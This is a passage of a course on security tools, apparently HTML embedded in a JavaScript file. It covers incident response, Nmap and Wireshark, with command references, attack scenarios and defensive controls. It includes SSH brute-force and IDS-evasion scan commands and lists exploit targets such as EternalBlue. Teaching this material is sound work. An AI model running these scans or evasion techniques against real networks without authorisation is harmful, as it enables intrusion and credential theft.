                  <li>Preparation involves planning, training, tools, and backups.</li>
                  <li>Identification detects and confirms incidents.</li>
                  <li>Containment limits scope and impact.</li>
                  <li>Eradication removes the threat and root cause.</li>
                  <li>Recovery restores normal operations.</li>
                  <li>Lessons Learned improves future response.</li>
                  <li>Roles: IR Manager, SOC Analysts, Forensic Analysts, Legal, HR, PR.</li>
                  <li>Frameworks: NIST SP 800-61, SANS, ISO 27035.</li>
                  <li>Attackers try to evade IR by delaying detection, destroying evidence, and re-entering.</li>
                  <li>Defenders use playbooks, automation, threat intelligence, and continuous improvement.</li>
                  <li>Tools: TheHive, MISP, Volatility, FTK, Autopsy, Wireshark, Zeek, Sysmon, Velociraptor, Shuffle, SIEM, EDR.</li>
                  <li>Metrics: MTTD, MTTR, MTTC, MTTE, false positive rate.</li>
                  <li>Legal and regulatory compliance is essential.</li>
                  <li>Understanding the IR lifecycle is critical for minimizing damage and recovering quickly.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final" target="_blank" rel="noopener">NIST SP 800-61 — Incident handling guide</a>
                  <a href="https://www.sans.org/reading-room/whitepapers/incident/incident-handlers-handbook-33901" target="_blank" rel="noopener">SANS — Incident Handler's Handbook</a>
                  <a href="https://www.iso.org/standard/60803.html" target="_blank" rel="noopener">ISO/IEC 27035 — Incident management</a>
                  <a href="https://thehive-project.org/" target="_blank" rel="noopener">TheHive — Incident response platform</a>
                  <a href="https://www.misp-project.org/" target="_blank" rel="noopener">MISP — Threat intelligence sharing</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 6 — TOOLS
      // ============================================================
      {
        id: "m6",
        type: "part",
        number: 6,
        title: "Tools of the Trade",
        icon: "🧰",
        blurb: "A practitioner's toolkit. Each chapter introduces one tool — what it does, when to reach for it, and how to read its output safely.",
        chapters: [
                    { id: "6.1", title: "Nmap (Network Mapper)", pages: "551-566", read: 20,
            build: "Perform a full TCP/UDP scan of a lab network with Nmap and analyze results.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Nmap (Network Mapper)</strong> is a free and open-source utility for network discovery and security auditing. It was designed to rapidly scan large networks, although it works equally well against single hosts. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. While Nmap is commonly used for security audits, many systems and network administrators use it for routine tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.</p>
                <p>Nmap was originally written by Gordon Lyon (also known as Fyodor) and is maintained by the Nmap Project. It is available for Linux, Windows, macOS, and other platforms.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A penetration tester is hired to assess the security posture of a company's external network. They are given a range of public IP addresses. Using Nmap, the tester performs a TCP SYN scan on all ports of the target range. The scan reveals that one server has port 22 (SSH), port 80 (HTTP), and port 3306 (MySQL) open and accessible from the Internet. The tester then uses Nmap's service version detection (<code>-sV</code>) to identify the specific versions of SSH and MySQL running. The MySQL version is outdated and has known vulnerabilities. This finding is documented and reported to the client, who then blocks port 3306 at the firewall and patches the MySQL server.</p>
                <p>In another scenario, a system administrator uses Nmap to inventory all devices on the corporate network. The scan reveals an unauthorized device (a rogue access point) connected to the network. The administrator disconnects it and investigates how it was installed.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Nmap In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/nmap.png" alt="Nmap scan process — TCP SYN scan, service detection, OS fingerprinting, and NSE scripting" />
                  <figcaption>Figure 6.1 — Nmap sends crafted packets and analyzes responses to discover hosts, ports, services, and operating systems.</figcaption>
                </figure>

                <h4 class="sub-h">How Nmap Works</h4>
                <p>Nmap sends specially crafted packets to a target and analyzes the responses to determine the state of ports and services. It operates at the Network and Transport layers of the OSI model. The output is a list of scanned targets with information about each, depending on the options used. The key information is presented in the "Table of Interesting Ports," which lists the port number, protocol, service name, and state. States include: open, filtered, closed, and unfiltered.</p>

                <h4 class="sub-h">Scan Types</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Option</span><span>Scan Type</span><span>Description</span></div>
                  <div class="tool-row"><span>-sS</span><span>TCP SYN Scan</span><span>Default and most popular scan; stealthy, fast, requires root privileges.</span></div>
                  <div class="tool-row"><span>-sT</span><span>TCP Connect Scan</span><span>Completes full TCP three-way handshake; more reliable but easily logged.</span></div>
                  <div class="tool-row"><span>-sU</span><span>UDP Scan</span><span>Sends UDP packets; slower and less reliable than TCP scans.</span></div>
                  <div class="tool-row"><span>-sA</span><span>ACK Scan</span><span>Used for firewall detection; cannot determine open/closed.</span></div>
                  <div class="tool-row"><span>-sF</span><span>FIN Scan</span><span>Sends TCP FIN packets; can bypass some stateless firewalls.</span></div>
                  <div class="tool-row"><span>-sN</span><span>NULL Scan</span><span>Sends packets with no flags set.</span></div>
                  <div class="tool-row"><span>-sX</span><span>Xmas Scan</span><span>Sets FIN, PSH, and URG flags.</span></div>
                  <div class="tool-row"><span>-sI</span><span>Idle (Zombie) Scan</span><span>Uses a zombie host to hide the attacker's IP.</span></div>
                  <div class="tool-row"><span>-sn</span><span>Ping Scan</span><span>Host discovery only; no port scan.</span></div>
                </div>

                <h4 class="sub-h">Common Options</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Option</span><span>Purpose</span></div>
                  <div class="tool-row"><span>-p 80,443</span><span>Scan specific ports.</span></div>
                  <div class="tool-row"><span>-p 1-1000</span><span>Scan a port range.</span></div>
                  <div class="tool-row"><span>-p-</span><span>Scan all 65535 ports.</span></div>
                  <div class="tool-row"><span>-F</span><span>Fast scan (top 100 ports).</span></div>
                  <div class="tool-row"><span>--top-ports 1000</span><span>Scan top 1000 ports.</span></div>
                  <div class="tool-row"><span>-sV</span><span>Service and version detection.</span></div>
                  <div class="tool-row"><span>-O</span><span>Operating system detection.</span></div>
                  <div class="tool-row"><span>-A</span><span>Aggressive scan (enables OS, version, script, and traceroute).</span></div>
                  <div class="tool-row"><span>-Pn</span><span>Skip host discovery (treat host as online).</span></div>
                  <div class="tool-row"><span>-n</span><span>No DNS resolution (faster).</span></div>
                  <div class="tool-row"><span>-T0 to -T5</span><span>Timing templates (paranoid to insane).</span></div>
                  <div class="tool-row"><span>--script</span><span>Run NSE scripts.</span></div>
                  <div class="tool-row"><span>-oN, -oX, -oG</span><span>Output formats (normal, XML, grepable).</span></div>
                </div>

                <h4 class="sub-h">Nmap Scripting Engine (NSE)</h4>
                <p>The Nmap Scripting Engine (NSE) is a powerful framework that extends Nmap's capabilities beyond basic port scanning. It uses the Lua programming language to automate a wide range of networking tasks, including vulnerability detection, service discovery, and backdoor detection.</p>
                <p>NSE scripts are organized into categories: <strong>auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln</strong>. The default category runs safe, useful scripts automatically when <code>-sC</code> or <code>-A</code> is used. The vuln category checks for known vulnerabilities.</p>
                <pre><code>nmap --script http-enum -p 80 192.168.1.10
nmap --script smb-os-discovery 192.168.1.10
nmap --script ssh-brute -p 22 192.168.1.10
nmap --script vuln 192.168.1.10
nmap --script "http-*" 192.168.1.10</code></pre>

                <h4 class="sub-h">Firewall and IDS Evasion Techniques</h4>
                <ul class="content-list">
                  <li><strong>Packet Fragmentation (-f):</strong> Splits packets into smaller fragments to bypass simple filters.</li>
                  <li><strong>Decoy Scanning (-D RND:10):</strong> Sends packets from decoy IP addresses to obscure the real source.</li>
                  <li><strong>Spoofing MAC Address (--spoof-mac):</strong> Changes the source MAC address.</li>
                  <li><strong>Timing Manipulation (-T0, --scan-delay):</strong> Slows the scan to evade rate-based detection.</li>
                  <li><strong>Source Port Manipulation (--source-port):</strong> Uses a trusted source port (e.g., 53, 80) to bypass firewall rules.</li>
                  <li><strong>Idle Scan (-sI):</strong> Uses a zombie host to scan the target, hiding the attacker's IP.</li>
                  <li><strong>Host Discovery Bypass (-Pn):</strong> Skips ping and treats all hosts as online.</li>
                </ul>
                <p>There is no magic bullet for evading firewalls and IDS systems; it requires skill and experience.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Reconnaissance Phase</span>
                    <ul>
                      <li>Identify live hosts on a network.</li>
                      <li>Discover open ports and running services.</li>
                      <li>Determine service versions and operating systems.</li>
                      <li>Map the attack surface.</li>
                      <li>Find potential entry points for exploitation.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Scenarios</span>
                    <ul>
                      <li><strong>SSH Brute Force:</strong> Open port 22 → use Hydra or Nmap NSE ssh-brute.</li>
                      <li><strong>Web Application Attacks:</strong> Open port 80/443 → use Burp Suite, SQLMap, or Nikto.</li>
                      <li><strong>Database Exploitation:</strong> Open port 3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL) → attempt default credentials or known exploits.</li>
                      <li><strong>RDP Attacks:</strong> Open port 3389 → brute force or exploit BlueKeep.</li>
                      <li><strong>SMB Attacks:</strong> Open port 445 → exploit EternalBlue (MS17-010).</li>
                      <li><strong>FTP Anonymous Login:</strong> Open port 21 → attempt anonymous access.</li>
                      <li><strong>Telnet:</strong> Open port 23 → capture plaintext credentials.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Tools Used by Attackers</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Nmap</span><span>Primary port scanner</span></div>
                  <div class="tool-row"><span>Masscan</span><span>Extremely fast port scanner (scans entire Internet in minutes)</span></div>
                  <div class="tool-row"><span>Zmap</span><span>Fast Internet-wide scanner</span></div>
                  <div class="tool-row"><span>Unicornscan</span><span>Asynchronous TCP/UDP scanner</span></div>
                  <div class="tool-row"><span>Hping3</span><span>Packet crafting for custom scans</span></div>
                  <div class="tool-row"><span>Netcat</span><span>Banner grabbing and port testing</span></div>
                  <div class="tool-row"><span>Metasploit</span><span>Includes auxiliary scanners</span></div>
                  <div class="tool-row"><span>Nmap NSE</span><span>Scripts for enumeration and exploitation</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Detection of Port Scans</h4>
                <ul class="content-list">
                  <li><strong>IDS/IPS Signatures:</strong> Snort and Suricata have rules to detect Nmap scan patterns (SYN scans, FIN scans, NULL scans, Xmas scans).</li>
                  <li><strong>Port Scan Detectors:</strong> Tools like PortSentry and Scanlogd monitor for scan activity.</li>
                  <li><strong>Log Analysis:</strong> Firewall logs show multiple connection attempts to different ports from the same source.</li>
                  <li><strong>NetFlow Analysis:</strong> Sudden increase in connections to multiple ports indicates scanning.</li>
                  <li><strong>Honeypots:</strong> Deploy honeypots to detect and analyze scanning activity.</li>
                </ul>

                <h4 class="sub-h">Prevention and Mitigation</h4>
                <ul class="content-list">
                  <li><strong>Firewall Rules (iptables):</strong> Drop invalid TCP flag combinations, limit connection rates, and block unused ports.</li>
                </ul>
                <pre><code>sudo iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ACK,FIN FIN -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ACK,PSH PSH -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ACK,URG URG -j DROP</code></pre>
                <ul class="content-list">
                  <li><strong>Rate Limiting:</strong> Limit incoming connections per IP to slow down scans and reduce accuracy.</li>
                  <li><strong>Close Unused Ports:</strong> Disable unnecessary services and close unused ports.</li>
                  <li><strong>Port Knocking:</strong> Keep ports closed until a specific sequence of connection attempts is made.</li>
                  <li><strong>Network Segmentation:</strong> Isolate critical systems to limit scan scope.</li>
                  <li><strong>Change Default Ports:</strong> Move services to non-standard ports (security through obscurity).</li>
                  <li><strong>Use a WAF:</strong> Web Application Firewalls can detect and block scanning of web ports.</li>
                </ul>

                <h4 class="sub-h">Hardening Services</h4>
                <ul class="content-list">
                  <li><strong>Patch Management:</strong> Keep all services updated to prevent exploitation of known vulnerabilities.</li>
                  <li><strong>Strong Authentication:</strong> Use strong passwords, key-based authentication (SSH), and MFA.</li>
                  <li><strong>Disable Default Accounts:</strong> Remove or rename default accounts (e.g., admin, root).</li>
                  <li><strong>Least Privilege:</strong> Run services with minimal privileges.</li>
                  <li><strong>Encryption:</strong> Use TLS/SSL for all services that support it.</li>
                  <li><strong>Banner Grabbing Prevention:</strong> Configure services to not reveal version information in banners.</li>
                </ul>

                <h4 class="sub-h">Monitoring and Response</h4>
                <ul class="content-list">
                  <li><strong>Log Aggregation:</strong> Centralize firewall, IDS, and server logs.</li>
                  <li><strong>SIEM Correlation:</strong> Detect patterns of scanning across multiple sources.</li>
                  <li><strong>Alerting:</strong> Alert on multiple connection attempts to different ports from the same IP.</li>
                  <li><strong>Incident Response:</strong> If a scan is detected, investigate whether it was followed by exploitation attempts.</li>
                  <li><strong>Threat Intelligence:</strong> Block known malicious IPs that are scanning the Internet.</li>
                </ul>

                <h4 class="sub-h">Legal and Ethical Considerations</h4>
                <ul class="content-list">
                  <li><strong>Authorization:</strong> Only scan systems you own or have written permission to scan.</li>
                  <li><strong>Scope:</strong> Stay within the agreed scope of testing.</li>
                  <li><strong>Reporting:</strong> Report all findings to the client.</li>
                  <li><strong>Confidentiality:</strong> Protect any data discovered during scanning.</li>
                  <li><strong>Laws:</strong> In Pakistan, unauthorized scanning may violate PECA 2016.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool/Resource</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Nmap Official Site</span><span>Download and documentation</span></div>
                  <div class="tool-row"><span>Nmap Reference Guide</span><span>Complete command reference</span></div>
                  <div class="tool-row"><span>Nmap Network Scanning (Book)</span><span>Official guide by Fyodor</span></div>
                  <div class="tool-row"><span>NSE Documentation Portal</span><span>List of all NSE scripts</span></div>
                  <div class="tool-row"><span>Nmap Cheatsheet (Black Hills)</span><span>Quick reference for commands</span></div>
                  <div class="tool-row"><span>Masscan</span><span>Fast port scanner</span></div>
                  <div class="tool-row"><span>Zmap</span><span>Internet-wide scanner</span></div>
                  <div class="tool-row"><span>Hping3</span><span>Packet crafting</span></div>
                  <div class="tool-row"><span>Netcat</span><span>Banner grabbing</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Packet capture and analysis</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>PortSentry</span><span>Port scan detector</span></div>
                  <div class="tool-row"><span>Scanlogd</span><span>Port scan detector</span></div>
                  <div class="tool-row"><span>Shodan</span><span>Internet-connected device search</span></div>
                  <div class="tool-row"><span>Censys</span><span>Internet-wide scanning</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Essential Nmap Commands</span></div>
                  <pre><code># Basic scan (top 1000 ports)
nmap 192.168.1.1

# Scan specific ports
nmap -p 80,443 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# SYN stealth scan
nmap -sS 192.168.1.1

# TCP connect scan
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1

# Skip host discovery
nmap -Pn 192.168.1.1

# Aggressive timing
nmap -T4 192.168.1.1

# Vulnerability scan
nmap --script vuln 192.168.1.1

# Fragment packets
nmap -f 192.168.1.1

# Decoy scan
nmap -D RND:10 192.168.1.1

# XML output
nmap -oX output.xml 192.168.1.1</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Nmap is the industry-standard open-source tool for network discovery and security auditing.</li>
                  <li>It determines live hosts, open ports, running services, operating systems, and firewall types.</li>
                  <li>Common scan types: SYN, Connect, UDP, FIN, NULL, Xmas, ACK, Idle.</li>
                  <li>Nmap provides service detection, OS fingerprinting, and NSE scripting.</li>
                  <li>NSE scripts automate vulnerability detection, enumeration, and brute forcing.</li>
                  <li>Attackers use Nmap for reconnaissance and to find entry points.</li>
                  <li>Defenders detect scans via IDS/IPS, log analysis, and port scan detectors.</li>
                  <li>Defenses include iptables rules, rate limiting, closing unused ports, and hardening services.</li>
                  <li>Firewall evasion techniques include fragmentation, decoys, timing manipulation, and idle scans.</li>
                  <li>Tools: Nmap, Masscan, Zmap, Shodan, Snort, Suricata, PortSentry.</li>
                  <li>Always obtain written permission before scanning any network.</li>
                  <li>Understanding Nmap is essential for both offensive and defensive security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Official site</a>
                  <a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">Nmap Reference Guide</a>
                  <a href="https://nmap.org/book/" target="_blank" rel="noopener">Nmap Network Scanning (Book)</a>
                  <a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">NSE Documentation Portal</a>
                  <a href="https://www.blackhillsinfosec.com/nmap-cheatsheet/" target="_blank" rel="noopener">Nmap Cheatsheet (Black Hills)</a>
                </div>
              </section>
            ` },
                    { id: "6.2", title: "Wireshark", pages: "567-582", read: 20,
            build: "Capture and analyze HTTP traffic with Wireshark, extracting credentials from a plaintext login.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Wireshark</strong> is a free and open-source packet analyzer used for network troubleshooting, analysis, software and protocol development, and education. It allows users to capture and interactively browse the traffic running on a computer network. Wireshark provides deep inspection of hundreds of protocols, live capture and offline analysis, a rich display filter language, and the ability to reconstruct TCP streams. It is the de facto standard for network protocol analysis and is widely used by network administrators, security analysts, penetration testers, and forensic investigators.</p>
                <p>Wireshark runs on Linux, Windows, macOS, and other Unix-like operating systems. It uses the libpcap (or Npcap on Windows) library to capture packets from network interfaces, and it can also read captured packets from files produced by other tools such as tcpdump.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A network administrator receives complaints that a web application is slow. They start a Wireshark capture on the server’s network interface and filter for HTTP traffic. The capture reveals a large number of TCP retransmissions and duplicate ACKs between the server and a specific client. Further analysis shows that the client’s network link is experiencing packet loss. The administrator works with the network team to fix the issue, and the application performance improves.</p>
                <p>A security analyst investigates a suspected malware infection. They capture traffic from the infected host and notice periodic DNS queries to a suspicious domain, followed by HTTPS connections to an unfamiliar IP address. By analyzing the TLS handshake, they extract the server certificate and identify the command-and-control (C2) server. The analyst blocks the domain and IP at the firewall and initiates incident response.</p>
                <p>A penetration tester uses Wireshark to capture traffic while performing a man-in-the-middle attack in a lab environment. They extract credentials from an unencrypted HTTP login form, demonstrating the risk of transmitting sensitive data over plaintext protocols.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Wireshark In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/wireshark.png" alt="Wireshark interface — packet list, packet details, and packet bytes panes with display filters" />
                  <figcaption>Figure 6.2 — Wireshark's main window: Packet List, Packet Details, and Packet Bytes. Display filters help isolate relevant traffic.</figcaption>
                </figure>

                <h4 class="sub-h">How Wireshark Works</h4>
                <p>Wireshark captures packets from a network interface in promiscuous mode, which allows the interface to receive all traffic on the network segment, not just traffic addressed to it. In switched networks, this may require port mirroring (SPAN) or a network tap to see traffic from other devices. Wireshark then decodes the packets according to the appropriate protocol dissectors and displays them in a graphical user interface.</p>
                <p>The main window consists of three panes:</p>
                <ul class="content-list">
                  <li><strong>Packet List:</strong> A summary of each captured packet (number, time, source, destination, protocol, length, info).</li>
                  <li><strong>Packet Details:</strong> A tree view of the protocols and fields within the selected packet.</li>
                  <li><strong>Packet Bytes:</strong> A hex and ASCII dump of the selected packet’s raw data.</li>
                </ul>

                <h4 class="sub-h">Capture vs Display Filters</h4>
                <p><strong>Capture filters</strong> are applied before capture begins and determine which packets are recorded. They use Berkeley Packet Filter (BPF) syntax.</p>
                <pre><code>host 192.168.1.10
port 80
tcp
not arp</code></pre>
                <p><strong>Display filters</strong> are applied after capture and determine which packets are shown. They are more powerful and use Wireshark’s own syntax.</p>
                <pre><code>ip.addr == 192.168.1.10
tcp.port == 443
http.request.method == "GET"
dns.qry.name contains "example.com"
tcp.flags.syn == 1 and tcp.flags.ack == 0</code></pre>

                <h4 class="sub-h">Key Features</h4>
                <ul class="content-list">
                  <li><strong>Live Capture:</strong> Capture packets in real time from wired or wireless interfaces.</li>
                  <li><strong>Offline Analysis:</strong> Open and analyze previously captured files (pcap, pcapng).</li>
                  <li><strong>Protocol Dissection:</strong> Supports thousands of protocols, with deep decoding.</li>
                  <li><strong>Stream Reconstruction:</strong> Follow TCP, UDP, or TLS streams to see the full conversation.</li>
                  <li><strong>Statistics:</strong> Generate summaries of protocols, endpoints, conversations, I/O graphs.</li>
                  <li><strong>Expert Information:</strong> Highlights potential problems (retransmissions, duplicate ACKs, malformed packets).</li>
                  <li><strong>Decryption:</strong> Supports decryption of TLS, WPA/WPA2, and other protocols if keys are provided.</li>
                  <li><strong>Extensibility:</strong> Lua scripting for custom dissectors and analysis.</li>
                  <li><strong>Command-Line Tool:</strong> tshark provides similar functionality without a GUI.</li>
                </ul>

                <h4 class="sub-h">Common Use Cases</h4>
                <ul class="content-list">
                  <li>Network troubleshooting (latency, packet loss, misconfigurations).</li>
                  <li>Security analysis (intrusion detection, malware traffic analysis, credential sniffing).</li>
                  <li>Protocol development and debugging.</li>
                  <li>Performance analysis (throughput, response times).</li>
                  <li>Forensic investigation (evidence capture, chain of custody).</li>
                  <li>Education and learning (understanding protocols in action).</li>
                </ul>

                <h4 class="sub-h">tshark – Command-Line Wireshark</h4>
                <p>tshark is the terminal-based version of Wireshark. It is useful for capturing on remote systems, automating analysis, and processing large capture files.</p>
                <pre><code>tshark -i eth0                             # Capture on interface eth0
tshark -i eth0 -w capture.pcap             # Write capture to file
tshark -r capture.pcap                     # Read capture file
tshark -r capture.pcap -Y "http.request"   # Apply display filter
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port  # Extract fields
tshark -i eth0 -f "tcp port 80"            # Apply capture filter
tshark -r capture.pcap -z io,stat,1        # Generate I/O statistics</code></pre>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors (Traffic Sniffing)</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Traffic Sniffing</span>
                    <ul>
                      <li><strong>Credentials:</strong> HTTP Basic Auth, FTP, Telnet, SMTP, POP3, IMAP transmit credentials in plaintext.</li>
                      <li><strong>Session Cookies:</strong> HTTP traffic can reveal session cookies, enabling session hijacking.</li>
                      <li><strong>Data Exfiltration:</strong> Monitor outbound traffic to detect data being sent to attacker-controlled servers.</li>
                      <li><strong>Reconnaissance:</strong> Identify hosts, services, operating systems, and network topology.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Man-in-the-Middle (MITM)</span>
                    <ul>
                      <li>Attacker positions themselves between client and server.</li>
                      <li>Uses Wireshark to capture and analyze all traffic.</li>
                      <li>If traffic is unencrypted or can be decrypted, they can steal credentials, modify data, and inject malicious content.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Malware Traffic Analysis</span>
                    <ul>
                      <li>Identify C2 servers and protocols.</li>
                      <li>Extract files transferred over the network.</li>
                      <li>Understand beaconing patterns and intervals.</li>
                      <li>Detect DNS tunneling and data exfiltration.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Wireless Attacks</span>
                    <ul>
                      <li>Capture WPA/WPA2 handshakes for offline cracking.</li>
                      <li>Analyze wireless frames to identify devices and access points.</li>
                      <li>Perform deauthentication attacks (with other tools) and capture reconnection handshakes.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Evasion and Detection Challenges</h4>
                <ul class="content-list">
                  <li>Attackers may attempt to evade Wireshark analysis by using encrypted protocols (HTTPS, SSH, VPN).</li>
                  <li>Obfuscating traffic with custom protocols or tunneling.</li>
                  <li>Fragmenting packets or using non-standard ports.</li>
                  <li>Injecting noise to overwhelm the analyst.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Network Monitoring and Incident Response</h4>
                <ul class="content-list">
                  <li>Detect intrusions and anomalies.</li>
                  <li>Analyze malware traffic and extract IOCs.</li>
                  <li>Verify firewall and IDS/IPS rules.</li>
                  <li>Troubleshoot network performance issues.</li>
                  <li>Conduct forensic investigations and preserve evidence.</li>
                </ul>

                <h4 class="sub-h">Best Practices for Defenders</h4>
                <ul class="content-list">
                  <li><strong>Capture on Critical Segments:</strong> Use port mirroring or network taps to monitor key links.</li>
                  <li><strong>Use Capture Filters:</strong> Limit capture to relevant traffic to reduce file size and noise.</li>
                  <li><strong>Encrypt Sensitive Traffic:</strong> Use HTTPS, SSH, VPN to prevent credential theft.</li>
                  <li><strong>Monitor Outbound Traffic:</strong> Detect C2 communication and data exfiltration.</li>
                  <li><strong>Baseline Normal Traffic:</strong> Know what normal looks like to spot anomalies.</li>
                  <li><strong>Integrate with SIEM:</strong> Forward captured metadata to SIEM for correlation.</li>
                  <li><strong>Train Analysts:</strong> Ensure staff can use Wireshark effectively.</li>
                  <li><strong>Legal Compliance:</strong> Obtain proper authorization before capturing traffic.</li>
                </ul>

                <h4 class="sub-h">Detection of Sniffing</h4>
                <ul class="content-list">
                  <li><strong>Network Monitoring:</strong> Look for interfaces in promiscuous mode.</li>
                  <li><strong>ARP Monitoring:</strong> Detect ARP spoofing that enables MITM.</li>
                  <li><strong>Switch Security:</strong> Use port security, DHCP snooping, and dynamic ARP inspection.</li>
                  <li><strong>Encryption:</strong> Even if traffic is captured, encryption protects confidentiality.</li>
                </ul>

                <h4 class="sub-h">Forensic Use</h4>
                <ul class="content-list">
                  <li><strong>Chain of Custody:</strong> Document capture time, location, and handling.</li>
                  <li><strong>Hash Verification:</strong> Compute hashes of capture files to ensure integrity.</li>
                  <li><strong>Storage:</strong> Store captures securely and retain per policy.</li>
                  <li><strong>Analysis:</strong> Use Wireshark and tshark to reconstruct events.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool/Resource</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Wireshark Official Site</span><span>Download and documentation</span></div>
                  <div class="tool-row"><span>Wireshark User's Guide</span><span>Comprehensive manual</span></div>
                  <div class="tool-row"><span>Wireshark Display Filter Reference</span><span>List of all display filters</span></div>
                  <div class="tool-row"><span>Wireshark Capture Filter Reference</span><span>BPF syntax for capture filters</span></div>
                  <div class="tool-row"><span>tshark Manual Page</span><span>Command-line usage</span></div>
                  <div class="tool-row"><span>Wireshark Sample Captures</span><span>PCAP files for practice</span></div>
                  <div class="tool-row"><span>Npcap</span><span>Windows packet capture library</span></div>
                  <div class="tool-row"><span>tcpdump</span><span>Command-line packet capture</span></div>
                  <div class="tool-row"><span>Cloudshark</span><span>Web-based PCAP analysis</span></div>
                  <div class="tool-row"><span>Malware Traffic Analysis</span><span>PCAP exercises</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Wireshark Display Filters</span></div>
                  <pre><code>ip.addr == 192.168.1.1       # Traffic to/from IP
tcp.port == 80               # TCP port 80
http                         # HTTP traffic
dns                          # DNS traffic
tcp.flags.syn == 1           # SYN packets
tcp.flags.reset == 1         # RST packets
http.request.method == "POST" # HTTP POST requests
http.response.code == 200    # HTTP 200 responses
tls.handshake.type == 1      # TLS Client Hello
icmp                         # ICMP traffic
arp                          # ARP traffic
!arp && !icmp                # Exclude ARP and ICMP</code></pre>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>tshark Commands</span></div>
                  <pre><code>tshark -i eth0                              # Capture on eth0
tshark -i eth0 -w capture.pcap              # Write to file
tshark -r capture.pcap                      # Read file
tshark -r capture.pcap -Y "http"            # Filter HTTP
tshark -r capture.pcap -T fields -e ip.src -e ip.dst  # Extract fields
tshark -i eth0 -f "tcp port 443"            # Capture filter
tshark -r capture.pcap -z io,stat,1         # I/O statistics
tshark -r capture.pcap -q -z conv,tcp       # TCP conversations</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Wireshark is the industry-standard open-source packet analyzer.</li>
                  <li>It captures and decodes network traffic for troubleshooting, security, and forensics.</li>
                  <li>Capture filters (BPF) apply before capture; display filters apply after.</li>
                  <li>tshark is the command-line version for automation and remote capture.</li>
                  <li>Attackers use Wireshark for sniffing credentials, MITM, and malware analysis.</li>
                  <li>Defenders use Wireshark for monitoring, incident response, and forensics.</li>
                  <li>Encryption (HTTPS, SSH, VPN) protects traffic even if captured.</li>
                  <li>Network segmentation, port security, and DAI help prevent sniffing.</li>
